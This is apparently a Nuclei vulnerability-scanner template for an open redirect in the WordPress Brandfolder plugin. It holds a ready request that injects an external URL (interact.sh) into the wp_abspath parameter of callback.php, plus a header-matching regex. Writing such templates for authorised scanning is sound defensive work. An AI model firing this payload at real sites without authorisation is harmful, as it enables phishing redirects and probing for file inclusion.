id: brandfolder-open-redirect
info:
  author: 0x_Akoko
  description: A vulnerability in WordPress Brandfolder allows remote attackers to
    inject an arbitrary URL into the 'callback.php' endpoint via the 'wp_abspath'
    parameter which will redirect the victim to it.
  name: WordPress Brandfolder Plugin Open Redirect
  reference:
  - https://www.exploit-db.com/exploits/39591
  severity: low
  tags: wordpress,wp-plugin,lfi,rfi
requests:
- matchers:
  - part: header
    regex:
    - (?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]*)interact\.sh.*$
    type: regex
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://interact.sh/'
